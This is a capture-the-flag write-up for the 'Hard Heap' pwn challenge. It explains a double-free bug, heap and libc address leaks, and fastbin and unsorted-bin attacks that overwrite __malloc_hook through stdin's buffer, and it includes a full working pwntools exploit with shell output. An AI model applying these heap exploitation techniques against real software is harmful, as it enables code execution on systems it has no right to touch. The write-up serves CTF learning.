# Hard Heap
To solve this challenge **completely** ( it means not using 0x56 size chunk which depends on ASLR ), 
you have to know `Fastbins attack`, `Unsorted bins attack` and `IO_BUF_END`.

## Checksec
```
bound7@ubuntu:~/Desktop/ctf/hard_heap$ checksec hard-heap 
[*] '/home/bound7/Desktop/ctf/hard_heap/hard-heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Because this challenge use `glibc 2.23`, I solved this challenge at `Ubuntu 16.04`.

## Vulnerability
In '**Antisice a deet**', There is a bug that is not initialize global heap pointer to **NULL**

```
unsigned __int64 sub_CEF()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Which deet would you like to antisice?");
  printf("> ");
  _isoc99_scanf("%u", &v1);
  getchar();
  if ( v1 > 0x13 )
  {
    puts("Invalid index!");
    exit(-1);
  }
  free((void *)global_202060[v1]);
  // global_202060[v1] = 0;
  return __readfsqword(0x28u) ^ v2;
}
```
So we can `double free` same heap pointer.

## Heap Address Leak
Just double free same chunk and print it.
```
free(0)
free(1)
free(0)

show(0)
heap_30 = u64(p.recv(6).ljust(8, '\x00'))
heap_base = heap_30 - 0x30
print 'heap_base : '+hex(heap_base)
```

# Libc Address Leak
Because we can `malloc` at most 0x48 size, we can't create *smallbin but not fastbin chunk*.
But here we can use `Fastbins attack`. After make **fake chunk** right before **target chunk**, we can modify **target chunk**'s size, fd, bk by allocating some fake data at **fake chunk** using `Fastbins attack`. 
I changed the size of **target chunk** to *0x91* and free this chunk to make *main_arena+88* pointer in heap memory.
```
alloc(0x20, p64(heap_base+0x20)+p64(0)*2+p64(0x31))
alloc(0x20, 'b'*0x8)
alloc(0x20, 'a'*0x8)

alloc(0x20, p64(0)+p64(0x91)+'b'*0x8) # change target chunk size value to 0x91

free(1)
show(6)
main_arena_88 = u64(p.recv(6).ljust(8, '\x00'))
```

# Get Shell
Of course, we can exploit this binary only using `fastbins attack`.
Because of ASLR, the start byte of heap chunk address changes. ( in gdb it starts with 0x55~ )
if we try to allocate data to 0x55 sized fake chunk, malloc think this chunk's `mmap_bit` is set and thus masking fake chunk's address which occurs segmentation fault. To exploit successfully only using `Fastbins attack`, the start of heap address must be 0x56 which is not reliable.
Anyway if heap address starts with 0x56, then we can use **pie_base + 0x202008** that is right before stdout, stdin, stderr pointer or **main_arena fastbin chunks** before **top chunk pointer**.

But here, i used `Unsorted bins attack` and just overwrite STDIN `IO_BUF_END` to overwrite `__malloc_hook`.
If we overwrite STDIN `IO_BUF_END`, the scanf buffer can overwrite `__malloc_hook` because `__malloc_hook` pointer is close to STDIN `IO_BUF_BASE`.
```
free(8)
alloc(0x20, p64(0)+p64(0x41)+p64(main_arena_88)+p64(io_buf_end-0x10))
alloc(0x30, p64(main_arena_88)+p64(main_arena_88))

io_stdfile_0_lock = libc_base + 3958672
io_wide_data_0 = libc_base + 3951040

payload = ''
payload += '\x0a\x31'+'\x00'*3
payload += p64(io_stdfile_0_lock)
payload += '\xff'*8 + p64(0)
payload += p64(io_wide_data_0)
payload += p64(0) * 3 + '\xff'*4+p32(0)
payload += p64(0) * 2
payload += p64(io_wide_data_0)
payload += p64(0) * 2
payload += p64(one_gadget) *2 * 22 # overwrite malloc hook to one_gadget
p.sendlineafter('> ', payload)
```

```
bound7@ubuntu:~/Desktop/ctf/hard_heap$ python ex.py 
[+] Opening connection to pwn.hsctf.com on port 5555: Done
heap_base : 0x55c8e1cd9000
main_arena+88 : 0x7f2a15a34b78
libc_base : 0x7f2a15670000
one_gadget : 0x7f2a15761147
[*] Switching to interactive mode
Enter the size of your deet: 
> $ id
UH\x89�H��dH\x8b\x04%(:id: not found
$ ls
bin
dev
flag
hard-heap
lib
lib32
lib64
libc.so.6
libc.so.6.zip
$ cat flag
hsctf{you_sice_deets_so_well_you_must_be_suchet}
```

## Full Exploit Code
```
from pwn import *

#p = process('./hard-heap')
p = remote('pwn.hsctf.com', 5555)

def choice(sel):
	p.sendlineafter('> ', str(sel))

def alloc(size, deet):
	choice(1)
	p.sendlineafter('> ', str(size))
	p.sendafter('> ', deet)

def show(index):
	choice(2)
	p.sendlineafter('> ', str(index))

def free(index):
	choice(3)
	p.sendlineafter('> ', str(index))

alloc(0x20, 'a'*0x8)
alloc(0x20, 'b'*0x8+p64(0)*2+p64(0x41))
alloc(0x28, 'c'*0x8+p64(0)*2+p64(0x21))
alloc(0x20, p64(0)+p64(0x51))
alloc(0x20, 'e'*0x8)
free(0)
free(1)
free(0)

show(0)
heap_30 = u64(p.recv(6).ljust(8, '\x00'))
heap_base = heap_30 - 0x30
print 'heap_base : '+hex(heap_base)

alloc(0x20, p64(heap_base+0x20)+p64(0)*2+p64(0x31))
alloc(0x20, 'b'*0x8)
alloc(0x20, 'a'*0x8)

alloc(0x20, p64(0)+p64(0x91)+'b'*0x8)

# 0 == 5 == 7 (0x10), 1 == 6 (0x40)
free(1)
show(6)
main_arena_88 = u64(p.recv(6).ljust(8, '\x00'))
libc_base = main_arena_88 - 3951480
malloc_hook = libc_base + 3951376
main_arena_fake = malloc_hook+0x10+0x8+0x5
io_buf_end = libc_base + 3950880
one_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_list[3]
print 'main_arena+88 : '+hex(main_arena_88)
print 'libc_base : '+hex(libc_base)
print 'one_gadget : '+hex(one_gadget)
free(8)
alloc(0x20, p64(0)+p64(0x41)+p64(main_arena_88)+p64(io_buf_end-0x10))
alloc(0x30, p64(main_arena_88)+p64(main_arena_88))

io_stdfile_0_lock = libc_base + 3958672
io_wide_data_0 = libc_base + 3951040

payload = ''
payload += '\x0a\x31'+'\x00'*3
payload += p64(io_stdfile_0_lock)
payload += '\xff'*8 + p64(0)
payload += p64(io_wide_data_0)
payload += p64(0) * 3 + '\xff'*4+p32(0)
payload += p64(0) * 2
payload += p64(io_wide_data_0)
payload += p64(0) * 2
payload += p64(one_gadget) *2 * 22 # overwrite malloc hook to one_gadget

#choice(2)
p.sendlineafter('> ', payload)

p.interactive()
```
